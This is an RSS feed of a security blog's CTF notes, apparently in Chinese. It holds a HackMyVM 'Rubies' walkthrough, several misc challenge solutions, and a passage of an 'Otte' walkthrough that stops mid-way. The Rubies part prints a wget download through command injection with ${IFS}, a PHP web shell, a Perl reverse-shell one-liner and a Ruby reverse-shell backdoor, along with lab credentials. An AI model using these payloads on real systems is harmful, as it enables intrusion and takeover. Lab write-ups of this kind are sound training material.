<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 30 Dec 2024 15:52:15 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 30 Dec 2024 15:52:10 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[19.rubies]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. git泄露" data-href="#2.1. git泄露" href="https://www.c1trus.top/about:blank#2.1._git泄露" class="internal-link" target="_self" rel="noopener nofollow">2.1. git泄露</a>
<br><a data-tooltip-position="top" aria-label="2.2. 文件上传" data-href="#2.2. 文件上传" href="https://www.c1trus.top/about:blank#2.2._文件上传" class="internal-link" target="_self" rel="noopener nofollow">2.2. 文件上传</a>


<br><a data-tooltip-position="top" aria-label="3. 代码审计 RCE利用" data-href="#3. 代码审计 RCE利用" href="https://www.c1trus.top/about:blank#3._代码审计_RCE利用" class="internal-link" target="_self" rel="noopener nofollow">3. 代码审计 RCE利用</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
<br><a data-tooltip-position="top" aria-label="5. git再利用" data-href="#5. git再利用" href="https://www.c1trus.top/about:blank#5._git再利用" class="internal-link" target="_self" rel="noopener nofollow">5. git再利用</a>
<br><a data-tooltip-position="top" aria-label="6. 再提权root" data-href="#6. 再提权root" href="https://www.c1trus.top/about:blank#6._再提权root" class="internal-link" target="_self" rel="noopener nofollow">6. 再提权root</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Rubies
<br>作者： <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ch4rm" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ch4rm" target="_blank">ch4rm</a><br>难度：⭐️⭐️⭐️⭐️
<br>知识点：ruby操作、空格绕过、文件替换、git利用
<br><br>nmap -sC -sV -p- 192.168.56.12
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 19:34 CST
Nmap scan report for 192.168.56.12
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 54:65:0b:7a:f3:5c:2f:1f:14:9e:bb:0e:44:0c:af:29 (RSA)
|   256 1f:5d:63:05:65:f7:cf:70:e4:0d:0a:45:80:77:50:2c (ECDSA)
|\_  256 69:a2:0f:83:dc:19:f2:c1:72:9c:a3:f8:09:44:3e:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|\_http-title: Cute Cat Only
|\_http-server-header: Apache/2.4.18 (Ubuntu)
| http-git:
|   192.168.56.12:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|\_    Last commit message: Why minnie?
MAC Address: 08:00:27:14:E7:BF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
<br>主页<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" referrerpolicy="no-referrer"><br>这里有两个按钮 还有一个next ，next会显示一些关于猫咪的故事<br>扫下目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.002.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.003.png" referrerpolicy="no-referrer"><br>两个利用点，git泄露与文件上传<br><br>python2 GitHack.py http://192.168.56.12/.git/
[+] Download and parse index file ...
bg/bg.gif
index.php
poems/poem1
poems/poem2
poems/poem3
poems/poem4
poems/poem5
uploads/cat1.gif
uploads/cat2.jpg
[OK] index.php
[Error] [Error 183] : u'192.168.56.12\\poems'
[Error] [Error 183] : u'192.168.56.12\\poems'
[OK] poems/poem1
[OK] poems/poem4
[OK] poems/poem5
[OK] uploads/cat2.jpg
[OK] poems/poem2
[OK] poems/poem3
[OK] uploads/cat1.gif
[OK] bg/bg.gif
<br>没啥东西<br><br>发现有文件上传的按钮 但是是点不了的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.004.png" referrerpolicy="no-referrer"><br>这多半是本地js控制的 修改一下<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.005.png" referrerpolicy="no-referrer"><br>将disable删掉<br>这样就可以上传文件了<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.006.png" referrerpolicy="no-referrer"><br>这里我上传了一个文件，但是发现不在uploads目录下，或者文件名字被改掉了<br>这里利用Githack获取一下文件目录，看看我的文件上传到哪里了<br>python2 GitHack.py http://192.168.56.12/.git/
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.007.png" referrerpolicy="no-referrer"><br> Upload functionality is currently disabled because Minnie messed up the code, lemme provide you with cute poems for the time being 
<br>上传功能目前暂时无法使用，因为 Minnie 把代码弄坏了。
让我先为你提供一些可爱的诗句吧！
<br>获取到一个用户名字<br>Minnie
<br><br>打开index.php，审计发现这里存在一个Rce漏洞<br> 用d盾也能扫出来<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.008.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.009.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.010.png" referrerpolicy="no-referrer"><br>差不多就是这样<br>&lt;?php echo $input ?&gt;
<br>$input是我们可以控制的。传入参数是poem<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.011.png" referrerpolicy="no-referrer"><br>尝试Rce发现 有waf<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.012.png" referrerpolicy="no-referrer"><br>再回去看下代码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.013.png" referrerpolicy="no-referrer"><br>过滤了空格<br>这个绕过用${IFS}即可<br>这里不太好直接弹shell<br>我们先传一个系统马上去<br>&lt;?php system($\_POST['cmd']);
echo "ok"?&gt;
<br>http://192.168.56.12/index.php?poem=;wget${IFS}http://192.168.56.6/shell.php
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.014.png" referrerpolicy="no-referrer"><br>然后弹shell<br>cmd=perl%20-e%20'use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1122%3Bsocket(S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr\_in(%24p%2Cinet\_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B'
<br><br>提权检测<br>(remote) www-data@rubies:/home/minnie$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
/usr/bin/mtr = cap\_net\_raw+ep

(remote) www-data@rubies:/var/www/html/uploads$ find / -perm -4000 2&gt;/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/at
/bin/ping
/bin/ping6
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
<br>看下用户目录下的提示<br>(remote) www-data@rubies:/home/minnie$ cat note.txt
Put anything you'd like to in the folder,
do not do dumb stuff pls
<br>“可以把任何你想要的东西放进这个文件夹里，
请不要做蠢事，谢谢。”
<br>意思是我们可以放任何东西到这个目录下<br>那我们是不是可以放我们的公钥呢<br>(remote) www-data@rubies:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov  2  2020 .
drwxr-xr-x 23 root root 4096 Nov  2  2020 ..
drwxr-xr-x  2 root root 4096 Nov  2  2020 minnie
<br>骗子啊。没有写入权限<br>还是看看提权吧<br>/usr/bin/systemd-detect-virt = cap\_dac\_override,cap\_sys\_ptrace+ep
/usr/bin/traceroute6.iputils = cap\_net\_raw+ep
/usr/bin/mtr = cap\_net\_raw+ep
<br>好像没有什么可以利用的<br><br>之前利用githack获取到了其中的Git目录下的一些文件<br>查看大佬的wp发现还有个GitTools工具<br>利用这个工具可以获取到包含一些凭据的历史记录...<br>/home/gitTools-v0.0.1/Dumper/gitdumper.sh http://192.168.56.12/.git/ git
cd /home/gitTools-v0.0.1/Dumper/git/.git
 git show HEAD
commit 052a0cb4865e29bc03278105e0232b20173f933d (HEAD -&gt; master)
Author: Your Name &lt;root@rubies.com&gt;
Date:   Mon Nov 2 14:27:16 2020 +0800

    Why minnie?

diff --git a/index.php b/index.php
index 41f0f2f..d33ca0d 100644
--- a/index.php
+++ b/index.php
@@ -8,33 +8,6 @@ if(isset($\_GET['poem'])){
                $output = shell\_exec("cat poems/".$input);
        }
 }
-
-
-// we dont need a login page dangit minnie! follow my orders pls
-$servername = "localhost";
-$username = "root";
-$password = "jd92khn49w";
-
-$conn = new mysqli($servername, $username, $password);
-
-if ($conn-&gt;connect\_error) {
-  die("Connection failed: " . $conn-&gt;connect\_error);
-}
-
-$login\_username=$\_POST['username'];
-$login\_password=$\_POST['password'];
-
-$sql = "SELECT \* FROM users WHERE Username = '$login\_username' AND Password = '$login\_password' ";
-$result = mysqli\_query($con,$sql);
-
-if(sqmli\_num\_rows($result)&lt;1){i
-       $\_SESSION['login']=$user\_id;
-       header('Location: http://ch4rm.pw/dashboard');
-}
-else{
-       $error = True;
-}
-
 ?&gt;

 &lt;html&gt;
(END)
<br>这里获取到一个密码<br>jd92khn49w
<br>经过尝试这是minnie用户的密码<br><br>su到minnie后发现minnie用户是一个Ruby Interactive shell （irb）<br>使用命令切换到一个bash shell<br>system("bash")
<br>H0wc00l\_i5\_Byp@@s1n9
<br>上面的几个提权检测没有东西<br>我们用pspy64看一下<br>2024/11/18 21:58:01 CMD: UID=0    PID=2681   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
2024/11/18 21:58:01 CMD: UID=0    PID=2680   | /bin/sh -c /usr/bin/ruby /root/bundle.rb
2024/11/18 21:58:01 CMD: UID=0    PID=2679   | /usr/sbin/CRON -f
2024/11/18 21:58:01 CMD: UID=0    PID=2682   | /bin/sh /sbin/dhclient-script
2024/11/18 21:58:01 CMD: UID=0    PID=2687   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
2024/11/18 21:58:01 CMD: UID=0    PID=2685   | /bin/sh /sbin/resolvconf -a enp0s3.dhclient
2024/11/18 21:58:01 CMD: UID=0    PID=2693   | /usr/bin/ruby /root/bundle.rb
<br>发现其每隔一段时间会运行一个ruby的脚本bundle.rb<br> /bin/sh -c /usr/bin/ruby /root/bundle.rb
<br>但是我们好像办法控制这个ruby脚本<br>再用linpeas.sh检测一下<br>发现/opt/cleaning目录是属于我们当前用户组的<br>而且这个目录下面还有文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.015.png" referrerpolicy="no-referrer"><br>这不得不让我感到有点好奇了<br>进目录看一下<br>ls -la
total 12
drwxrwxr-x 2 root minnie 4096 Nov  2  2020 .
drwxr-xr-x 3 root root   4096 Nov  2  2020 ..
-rw-r--r-- 1 root root    108 Nov  2  2020 webserver\_upload.rb
<br>目录下有一个.rb脚本<br>minnie@rubies:/opt/cleaning$ cat webserver\_upload.rb
require "find"

Find.find("/var/www/html/uploads/") do |file|
  File.delete("#{file}") if file=~/\.php/
end
<br>作用就是删掉我们网站uploads目录里面所有的php文件<br>看这个功能就大概可以猜测到这个文件肯定类似于一个定时任务会每隔一段时间就被执行，只是不知道为什么pspy64没有检测到<br>既然我们这个用户组有这个目录的权限<br>那我们可以替换掉这个文件<br>先删掉，然后创建一个同名的ruby后门<br>#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "192.168.56.6" 
#Set the Remote Host Port
PORT = "1234"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout\_and\_stderr |
              IO.copy\_stream(stdout\_and\_stderr, sock)
              end  
  end
rescue
  retry
end 
<br>开启监听等待一会 成功反弹shell提权root<br>很离谱这个root.txt可能有不可见字符<br>直接读取不了<br>cat \*root.txt\*
pyth0N&gt;r00bi35
]]></description><link>https://www.c1trus.top/24-渗透/hmv/19.rubies.html</link><guid isPermaLink="false">24-渗透/HMV/19.rubies.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:54:39 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/19.rubies.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Drawing 2024-12-24 15.53.06]]></title><description><![CDATA[ 
 
  
  
  
    
    
  
  ]]></description><link>https://www.c1trus.top/excalidraw/drawing-2024-12-24-15.53.06.excalidraw.html</link><guid isPermaLink="false">Excalidraw/Drawing 2024-12-24 15.53.06.excalidraw.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 05:44:52 GMT</pubDate></item><item><title><![CDATA[Misc]]></title><description><![CDATA[ 
 <br><br>hashcat破解就行了<br>$6$xyz$ZGQOqL77wiYAgPxsNEv2Kz3INjzK4JdG29RbaHaW5lrkH8bA8W7kC3GK4CctGrFO7.E2va7kSgF3eQXNWYQee.:reddragon

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$xyz$ZGQOqL77wiYAgPxsNEv2Kz3INjzK4JdG29RbaHaW5lrk...WYQee.
Time.Started.....: Tue Dec 24 22:18:28 2024 (1 sec)
Time.Estimated...: Tue Dec 24 22:18:29 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    53686 H/s (14.63ms) @ Accel:1024 Loops:128 Thr:32 Vec:1
Speed.#2.........:      804 H/s (7.84ms) @ Accel:32 Loops:64 Thr:16 Vec:1
Speed.#*.........:    54490 H/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32768/14344387 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 0/14344387 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4800-4864
Candidate.Engine.: Device Generator
Candidates.#1....: diego -&gt; keepout1
Candidates.#2....: 123456 -&gt; fuckyou1
Hardware.Mon.#1..: Temp: 51c Util: 99% Core:2535MHz Mem:8000MHz Bus:8
Hardware.Mon.#2..: N/A

HMV{reddragon}
<br><br>zip2john 008.zip
008.zip/flag.txt:$zip2$*0*3*0*751e06905814ebe63a63c72e8755d887*d807*e*25e3c7613e997071cd21a2163883*ba4cf18e59493b2515da*$/zip2$:flag.txt:008.zip:008.zip

john 008 --wordlist=/usr/share/wordlists/rockyou.txt
survivor         (008.zip/flag.txt)

HMV{cromiphi}

<br><br><img alt="assets/Pasted image 20241224225402.png" src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224225402.png"><br>
3-1表示 3号键第一个字母<br>$$$$$$$$$$ 
$_________$$ 
$_$$$$$$$_$$ 
$_$_____$_$$ 
$_$_____$_$$ 
$_$_____$_$$ 
$_$_____$_$$ 
$_$$$$$$$_$$ 
$_________$$ 
$$$$$$$$$$ 
$_________$$ 
$_1__2__3_$$$ 
$_4__5__6_$$$ 
$_7__8__9_$$$ 
$_*__0__#_$$$ 
$_________$$$ 
$$$$$$$$$$$ 
$$$$$$$$$ 
FLAG: 
HMV{?} 
? 
= 
3-1 D
2-1 A
8-1 T
2-1 A
7-4 S
3-2 E
2-3 C

HMV{DATASEC}
<br><br>echo -e "HMV{\033[31mw\033[31mh\033[31my\033[31m i\033[31mm \033[31mn\033[31mo\033[31mt \033[39m m\033[39ma\033[39my\033[39mb\033[39me \033[39mu\033[39ms\033[39me \033[32m g\033[32mr\033[32me\033[32me\033[32mn\033[32mt\033[32mh\033[32me\033[32mf\033[32ml\033[32ma\033[32mg\033[39m}"

HMV{greentheflag}

<br><br><a rel="noopener nofollow" class="external-link" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html" target="_blank">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a><br>HMV{MORSEGIVESYOUTHEFLAG}
<br><br>HMV{gifarefun}
<br><br>利用 aircrack-ng 爆破即可<br>┌──(root㉿kali)-[~/Desktop/hmv/MISC]
└─# aircrack-ng 033.pcap
Reading packets, please wait...
Opening 033.pcap
Read 71032 packets.

   #  BSSID              ESSID                     Encryption

   1  00:23:CD:1F:73:B0  WirelessLab               WEP (17314 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening 033.pcap
Read 71032 packets.

1 potential targets

Attack will be restarted every 5000 captured ivs.

                                               Aircrack-ng 1.7


                                 [00:00:00] Tested 60016 keys (got 17273 IVs)

   KB    depth   byte(vote)
    0    0/  1   4D(28160) 24(23808) 58(23552) 44(22528) B7(22528) 94(21760) D2(21504) 00(20992)
    1    4/ 34   59(21760) E1(21504) 5B(21504) B0(20992) 56(20736) 98(20736) A6(20736) B4(20480)
    2   36/ 45   04(19712) 16(19456) 41(19456) 56(19456) 7B(19456) 7C(19456) 81(19456) E6(19456)
    3   14/ 40   45(20992) D3(20992) 94(20736) 04(20736) 0F(20480) 58(20480) B2(20480) 00(20480)
    4    0/  1   59(27648) 6F(23040) 25(22016) 20(21760) 38(21760) 30(21504) 53(21504) 67(21504)

                     KEY FOUND! [ 4D:59:4B:45:59 ] (ASCII: MYKEY )
        Decrypted correctly: 100%

HMV{MYKEY}
<br><br>ey开头一眼jwt<br>
<img alt="assets/Pasted image 20241224233613.png" src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224233613.png"><br>HMV{DoNotStoreSensitiveDataHere}
<br><br><a rel="noopener nofollow" class="external-link" href="https://github.com/r3nt0n/keepass4brute" target="_blank">https://github.com/r3nt0n/keepass4brute</a><br>┌──(root㉿kali)-[~/Desktop/hmv/MISC]
└─# bash /root/Desktop/tools/keepass4brute.sh Challenge.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 498/14344392 - Attempts per minute: 1358 - Estimated time remaining: 1 weeks, 0 days
[+] Current attempt: amigos

[*] Password found: amigos


HMV{EasyPeasyMoney}
<br><br>execel文件的本质就是一个压缩包<br>
我们可以解压后用vscode打开<br>
全局搜索 flag 或者 hmv  没有找到。那多半是藏在二进制文件里面了<br>strings .\vbaProject.bin

HMV{b63ce4efbf0b4214a470a707d34bc3ba}
<br><br>9950b5c66f8518f8b012359dc7390589 c03ec75734f58d87cddff35c57786429 e757e84e31ef68a74d86d6b52478654c HMV{c761d942cf5fe4ba9ece382739afef4e} 
<br>利用rockyou爆破出前3个md5<br>
可以发现前三个可以爆破出来，而且是有规律的<br>
直接对第四的一个进行哈希碰撞<br>
<img alt="assets/Pasted image 20241225001025.png" src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241225001025.png"><br>4doggy1
3mimis2
2wagon3
1lordp4
HMV{1lordp4}
<br><br><a rel="noopener nofollow" class="external-link" href="https://ncviewer.com/" target="_blank">https://ncviewer.com/</a><br>
<img alt="assets/QQ20241225-001850.png" src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/qq20241225-001850.png"><br>HMV{engraving_a_trophy_for_Kerszi}
<br><br>用010查看发现是png<br>cybercheaf 解密 用hexdump下来即可<br>
<img alt="assets/Pasted image 20241225003154.png" src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241225003154.png"><br>解密后图片上有一个Base64编码的flag<br>HMV{ancienttimes1880}
<br><br>HMV{ilikechinese}]]></description><link>https://www.c1trus.top/24-渗透/hmv/challenges/misc.html</link><guid isPermaLink="false">24-渗透/HMV/challenges/Misc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224225402.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/challenges/assets/pasted-image-20241224225402.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[49.otte]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. ftp匿名登录" data-href="#2.1. ftp匿名登录" href="https://www.c1trus.top/about:blank#2.1._ftp匿名登录" class="internal-link" target="_self" rel="noopener nofollow">2.1. ftp匿名登录</a>
<br><a data-tooltip-position="top" aria-label="2.2. 爆破网站登录密码" data-href="#2.2. 爆破网站登录密码" href="https://www.c1trus.top/about:blank#2.2._爆破网站登录密码" class="internal-link" target="_self" rel="noopener nofollow">2.2. 爆破网站登录密码</a>
<br><a data-tooltip-position="top" aria-label="2.3. 目录爆破" data-href="#2.3. 目录爆破" href="https://www.c1trus.top/about:blank#2.3._目录爆破" class="internal-link" target="_self" rel="noopener nofollow">2.3. 目录爆破</a>
<br><a data-tooltip-position="top" aria-label="2.4. 参数爆破" data-href="#2.4. 参数爆破" href="https://www.c1trus.top/about:blank#2.4._参数爆破" class="internal-link" target="_self" rel="noopener nofollow">2.4. 参数爆破</a>


<br><a data-tooltip-position="top" aria-label="3. 提权到thomas" data-href="#3. 提权到thomas" href="https://www.c1trus.top/about:blank#3._提权到thomas" class="internal-link" target="_self" rel="noopener nofollow">3. 提权到thomas</a>

<br><a data-tooltip-position="top" aria-label="3.1. 恢复文件签名" data-href="#3.1. 恢复文件签名" href="https://www.c1trus.top/about:blank#3.1._恢复文件签名" class="internal-link" target="_self" rel="noopener nofollow">3.1. 恢复文件签名</a>


<br><a data-tooltip-position="top" aria-label="4. 提权到laetitia用户" data-href="#4. 提权到laetitia用户" href="https://www.c1trus.top/about:blank#4._提权到laetitia用户" class="internal-link" target="_self" rel="noopener nofollow">4. 提权到laetitia用户</a>

<br><a data-tooltip-position="top" aria-label="4.1. 代码审计" data-href="#4.1. 代码审计" href="https://www.c1trus.top/about:blank#4.1._代码审计" class="internal-link" target="_self" rel="noopener nofollow">4.1. 代码审计</a>


<br><a data-tooltip-position="top" aria-label="5. 提权到cedric用户" data-href="#5. 提权到cedric用户" href="https://www.c1trus.top/about:blank#5._提权到cedric用户" class="internal-link" target="_self" rel="noopener nofollow">5. 提权到cedric用户</a>
<br><a data-tooltip-position="top" aria-label="6. 提权到root" data-href="#6. 提权到root" href="https://www.c1trus.top/about:blank#6._提权到root" class="internal-link" target="_self" rel="noopener nofollow">6. 提权到root</a><br>
- <a data-tooltip-position="top" aria-label="6.1. 另外一种方案提权root" data-href="#6.1. 另外一种方案提权root" href="https://www.c1trus.top/about:blank#6.1._另外一种方案提权root" class="internal-link" target="_self" rel="noopener nofollow">6.1. 另外一种方案提权root</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Otte" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Otte</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# nmap 192.168.56.27 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 21:48 EST
Nmap scan report for 192.168.56.27
Host is up (0.00087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:B9:A1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds

<br><br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ftp 192.168.56.27
Connected to 192.168.56.27.
220 ProFTPD Server (Debian) [::ffff:192.168.56.27]
Name (192.168.56.27:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
226 Transfer complete
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||64320|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 .
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 ..
-rw-r--r--   1 ftp      ftp            89 May 15  2021 note.txt
226 Transfer complete
ftp&gt; get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||5844|)
150 Opening BINARY mode data connection for note.txt (89 bytes)
    89      250.47 KiB/s
226 Transfer complete
89 bytes received in 00:00 (92.55 KiB/s)
ftp&gt; exit
221 Goodbye.

┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# cat note.txt
Hi thomas ! I put on you personal folder the php code you asked me !

See you later +++

<br>这里获用户 thomas 而且告诉我们他的文件夹里面有一个PHP文件<br><br>网站需要验证身份<br>注意由于这个靶机有点老，而且是老外出的。所以这里的提示框会缺失提示信息，<br>
需要用老版本的浏览器才能显示<br>这里给大家分享一个浏览器，用这个浏览器就会显示提示信息<br>
<a rel="noopener nofollow" class="external-link" href="https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8" target="_blank">https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8</a><br>
访问网站会给我们提示 “Siemens - Root authentification”<br>
<img alt="Pasted image 20241228123243" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" referrerpolicy="no-referrer"><br>
那这里很可能就是西门子设备的默认账号密码<br>
常见的设备账面密码可以在<a data-tooltip-position="top" aria-label="https://forum.ywhack.com/password.php" rel="noopener nofollow" class="external-link" href="https://forum.ywhack.com/password.php" target="_blank">这里</a>查询(国内的比较全，西门子的我试了一下 这里面没有正确的)<br>
后面在这里获取到了一个常用的西门子默认账号密码表<br>
<a rel="noopener nofollow" class="external-link" href="https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/" target="_blank">https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/</a><br><br>burp爆破一下就能获取到密码，这里要对payload进行base64编码<br>
<img alt="Pasted image 20241228130727" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228130727.png" referrerpolicy="no-referrer"><br>
解码后的密码 root:zP2wxY4uE<br>
登录成功后会获取到一张图片<br>
<img alt="Pasted image 20241228131103" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228131103.png" referrerpolicy="no-referrer"><br>
